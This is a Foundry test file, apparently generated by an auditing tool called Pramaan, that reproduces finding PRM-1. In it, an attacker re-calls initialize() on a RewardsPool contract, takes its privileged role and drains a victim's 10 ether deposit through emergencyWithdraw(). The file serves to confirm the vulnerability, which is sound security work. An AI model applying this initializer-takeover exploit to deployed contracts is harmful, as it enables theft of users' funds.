// SPDX-License-Identifier: UNLICENSED
// Generated by Pramaan for finding PRM-1: template initializer-takeover@1, slots filled by heuristics.
// Hypothesis: RewardsPool.initialize(address,uint256) can be called again after deployment and hands its caller privileged roles.
// Property under test: Only the deployer-chosen owner may control the contract after initialization.
// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).
pragma solidity >=0.8.0 <0.9.0;

import {Test} from "lib/pramaan-forge-std/src/Test.sol";
import {RewardsPool as PramaanTarget} from "src/RewardsPool.sol";

contract PramaanExploit_PRM_1 is Test {
    PramaanTarget internal target;
    address internal owner = makeAddr("pramaan.owner");
    address internal victim = makeAddr("pramaan.victim");
    address internal attacker = makeAddr("pramaan.attacker");
    uint256 internal constant SEED = 10 ether;
    uint256 internal constant ATTACK = 1 ether;

    function setUp() public {
        vm.startPrank(owner);
        target = new PramaanTarget();
        target.initialize(owner, 0);
        vm.stopPrank();
        vm.deal(victim, SEED);
        vm.prank(victim);
        target.fund{value: SEED}();
    }

    function test_exploit() public {
        uint256 attackerBefore = attacker.balance;
        vm.startPrank(attacker);
        target.initialize(attacker, 0);
        target.emergencyWithdraw();
        vm.stopPrank();
        emit log_named_uint("pramaan.attacker_gain", attacker.balance - attackerBefore);
        assertGe(attacker.balance - attackerBefore, SEED, "Pramaan: re-initialising let an outsider take deposited ETH");
    }
}

